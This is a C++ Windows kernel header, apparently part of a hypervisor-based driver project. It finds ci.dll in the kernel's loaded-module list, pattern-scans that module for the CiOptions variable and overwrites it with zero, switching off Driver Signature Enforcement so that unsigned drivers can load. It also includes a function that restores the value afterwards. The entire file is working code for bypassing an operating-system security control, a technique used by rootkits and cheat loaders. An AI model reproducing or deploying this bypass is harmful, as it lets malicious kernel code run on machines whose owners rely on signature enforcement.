#pragma once
#include <ntifs.h>
#include <ntimage.h>
#include <cstdint>
#include "ept.h"
#include "dbg.h"
#include "tools.h"

// disable DSE by patching CiOptions in ci.dll
// CiOptions default = 0x6 (DSE + SecureBoot), set to 0x0 = all drivers allowed

namespace dse
{
	inline uint64_t g_ci_options_va = 0;

	// find ci.dll base by walking kernel module list (PsLoadedModuleList)
	inline uint64_t find_ci_base( )
	{
		// PsLoadedModuleList is exported by ntoskrnl
		typedef struct _LDR_DATA_TABLE_ENTRY
		{
			LIST_ENTRY InLoadOrderLinks;
			LIST_ENTRY InMemoryOrderLinks;
			LIST_ENTRY InInitializationOrderLinks;
			PVOID DllBase;
			PVOID EntryPoint;
			ULONG SizeOfImage;
			UNICODE_STRING FullDllName;
			UNICODE_STRING BaseDllName;
		} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

		UNICODE_STRING ci_name;
		RtlInitUnicodeString( &ci_name, L"CI.dll" );

		PLIST_ENTRY module_list = ( PLIST_ENTRY ) tools::get_system_routine( L"PsLoadedModuleList" );
		if ( !module_list )
			return 0;

		PLIST_ENTRY entry = module_list->Flink;
		for ( int i = 0; i < 256 && entry != module_list; i++ )
		{
			PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD( entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks );
			if ( RtlCompareUnicodeString( &mod->BaseDllName, &ci_name, TRUE ) == 0 )
				return ( uint64_t ) mod->DllBase;
			entry = entry->Flink;
		}

		return 0;
	}

	// get image size from PE header
	inline size_t get_image_size( uint64_t base )
	{
		auto dos = ( IMAGE_DOS_HEADER* ) base;
		if ( dos->e_magic != IMAGE_DOS_SIGNATURE ) return 0;
		auto nt = ( IMAGE_NT_HEADERS64* ) ( base + dos->e_lfanew );
		if ( nt->Signature != IMAGE_NT_SIGNATURE ) return 0;
		return nt->OptionalHeader.SizeOfImage;
	}

	// pattern scan in ci.dll for CiOptions
	// CiValidateImageHeader references CiOptions — we look for:
	//   mov dword ptr [CiOptions], ecx  =>  89 0D xx xx xx xx
	//   or
	//   cmp dword ptr [CiOptions], 0    =>  83 3D xx xx xx xx 00
	//   or
	//   mov eax, [CiOptions]            =>  8B 05 xx xx xx xx
	// check if a range is safe to read (skips discarded .INIT pages)
	inline bool is_range_valid( void* addr, size_t len )
	{
		uint8_t* p = ( uint8_t* ) addr;
		uint8_t* end = p + len;
		// check each page boundary
		while ( p < end )
		{
			if ( !MmIsAddressValid( p ) )
				return false;
			// advance to next page
			p = ( uint8_t* ) ( ( ( uint64_t ) p + 0x1000 ) & ~0xFFFULL );
		}
		return true;
	}

	inline uint64_t find_ci_options( uint64_t ci_base, size_t ci_size )
	{
		if ( !ci_base || !ci_size )
			return 0;

		uint8_t* base = ( uint8_t* ) ci_base;

		for ( size_t i = 0; i + 7 < ci_size; i++ )
		{
			// skip pages that are not mapped (discarded .INIT sections)
			if ( ( i & 0xFFF ) == 0 && !MmIsAddressValid( &base[i] ) )
			{
				i = ( i + 0x1000 ) & ~0xFFFULL;
				i--; // loop will i++
				continue;
			}

			// pattern: 83 3D xx xx xx xx 06 (cmp [CiOptions], 6)
			if ( base[i] == 0x83 && base[i + 1] == 0x3D && base[i + 6] == 0x06 )
			{
				int32_t rel = *( int32_t* ) ( &base[i + 2] );
				uint64_t addr = ( uint64_t ) ( &base[i + 7] ) + rel;

				if ( addr >= ci_base && addr < ci_base + ci_size && MmIsAddressValid( ( void* ) addr ) )
				{
					uint32_t val = *( uint32_t* ) addr;
					if ( val == 0x6 || val == 0x8006 )
					{
						log::dbg_print( "dse: CiOptions found via cmp at 0x%llx (val=0x%x)", addr, val );
						return addr;
					}
				}
			}

			// pattern: 8B 05 xx xx xx xx (mov eax, [CiOptions])
			if ( base[i] == 0x8B && base[i + 1] == 0x05 )
			{
				int32_t rel = *( int32_t* ) ( &base[i + 2] );
				uint64_t addr = ( uint64_t ) ( &base[i + 6] ) + rel;

				if ( addr >= ci_base && addr < ci_base + ci_size && MmIsAddressValid( ( void* ) addr ) )
				{
					uint32_t val = *( uint32_t* ) addr;
					if ( val == 0x6 || val == 0x8006 )
					{
						log::dbg_print( "dse: CiOptions found via mov at 0x%llx (val=0x%x)", addr, val );
						return addr;
					}
				}
			}

			// pattern: 89 0D xx xx xx xx (mov [CiOptions], ecx)
			if ( base[i] == 0x89 && base[i + 1] == 0x0D )
			{
				int32_t rel = *( int32_t* ) ( &base[i + 2] );
				uint64_t addr = ( uint64_t ) ( &base[i + 6] ) + rel;

				if ( addr >= ci_base && addr < ci_base + ci_size && MmIsAddressValid( ( void* ) addr ) )
				{
					uint32_t val = *( uint32_t* ) addr;
					if ( val == 0x6 || val == 0x8006 )
					{
						log::dbg_print( "dse: CiOptions found via mov-store at 0x%llx (val=0x%x)", addr, val );
						return addr;
					}
				}
			}
		}

		return 0;
	}

	// find and cache CiOptions address (call at init before virtualization)
	inline bool init( )
	{
		uint64_t ci_base = find_ci_base( );
		if ( !ci_base )
		{
			log::dbg_print( "dse: ci.dll not found" );
			return false;
		}

		size_t ci_size = get_image_size( ci_base );
		if ( !ci_size )
		{
			log::dbg_print( "dse: ci.dll PE parse failed" );
			return false;
		}

		log::dbg_print( "dse: ci.dll at 0x%llx, size 0x%x", ci_base, ( uint32_t ) ci_size );

		g_ci_options_va = find_ci_options( ci_base, ci_size );
		if ( !g_ci_options_va )
		{
			log::dbg_print( "dse: CiOptions not found" );
			return false;
		}

		return true;
	}

	// disable DSE by setting CiOptions to 0
	inline bool disable( )
	{
		if ( !g_ci_options_va )
			return false;

		uint32_t* ci_opts = ( uint32_t* ) g_ci_options_va;
		uint32_t old_val = *ci_opts;
		*ci_opts = 0;

		log::dbg_print( "dse: CiOptions patched 0x%x -> 0x0 at 0x%llx", old_val, g_ci_options_va );
		return true;
	}

	// restore DSE (optional, call after loading your driver)
	inline bool restore( )
	{
		if ( !g_ci_options_va )
			return false;

		uint32_t* ci_opts = ( uint32_t* ) g_ci_options_va;
		*ci_opts = 0x6;

		log::dbg_print( "dse: CiOptions restored to 0x6" );
		return true;
	}
}
